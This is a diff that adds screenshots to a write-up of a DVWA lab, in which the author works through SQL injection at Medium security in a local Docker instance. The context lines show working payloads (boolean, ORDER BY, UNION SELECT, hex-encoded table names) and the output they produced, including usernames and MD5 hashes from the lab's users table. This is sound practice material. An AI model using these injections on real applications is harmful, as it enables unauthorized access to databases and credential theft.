@@ -4,6 +4,8 @@ In this lab, I tested DVWA's **SQL Injection** module at the `Medium` security l
 
 Compared with Low, the application replaced the text field with a dropdown and escaped quote characters. My goal was to test whether those controls actually prevented SQL injection, then enumerate the database and extract data from the `users` table.
 
+![DVWA SQL Injection module at Medium security](images/00-intro.png)
+
 ## Environment
 
 - DVWA running locally with Docker
@@ -24,6 +26,10 @@ id=1&Submit=Submit
 
 The server returned the expected data for user ID `1`. Since the value was sent in a POST parameter, I could modify it in the intercepted request even though the browser did not provide a text field.
 
+![Normal dropdown request intercepted in Caido](images/01-dropdown-request.png)
+
+![Normal response for user ID 1](images/01-dropdown-response.png)
+
 ## Finding the injection context
 
 I first added a single quote:
@@ -42,6 +48,8 @@ id=1' OR 1=1 -- &Submit=Submit
 
 It failed because the quote was escaped. I removed the quote and tested:
 
+![Escaped quote shown in the MariaDB syntax error](images/02-escaped-quote-error.png)
+
 ```http
 id=1 OR 1=1 -- &Submit=Submit
 ```
@@ -55,6 +63,8 @@ Hack Me
 Pablo Picasso
 Bob Smith
 ```
+
+![Boolean SQL injection returning every user](images/03-boolean-injection.png)
 
 A false condition returned no results:
 
@@ -96,6 +106,8 @@ id=1 ORDER BY 3 -- &Submit=Submit
 
 This confirmed that the original query returned two columns.
 
+![ORDER BY 3 error confirming two columns](images/04-order-by-error.png)
+
 ## Confirming UNION-based injection
 
 I tested two numeric values to match the column count:
@@ -110,6 +122,8 @@ The response displayed both values:
 First name: 999
 Surname: 888
 ```
+
+![UNION SELECT values reflected in both columns](images/05-union-columns.png)
 
 This confirmed that both columns were reflected in the page and could be used to extract database information.
 
@@ -133,6 +147,8 @@ The application returned:
 10.11.18-MariaDB-ubu2204
 dvwa
 ```
+
+![MariaDB version and current database name](images/06-database-information.png)
 
 ## Enumerating tables
 
@@ -193,6 +209,8 @@ role
 account_enabled
 ```
 
+![Columns enumerated from the users table](images/07-column-enumeration.png)
+
 Here, unlike in my earlier `0x27` test, hexadecimal was useful because it represented the string `users` without quote characters.
 
 ## Extracting usernames and password hashes
@@ -213,6 +231,8 @@ gordonb e99a18c428cb38d5f260853678922e03
 pablo   0d107d09f5bbe40cade3de5c71e9e9b7
 smithy  5f4dcc3b5aa765d61d8327deb882cf99
 ```
+
+![Usernames and password hashes extracted from the users table](images/08-user-hashes.png)
 
 This demonstrated that the vulnerability allowed database schema enumeration and extraction of sensitive application data.
 
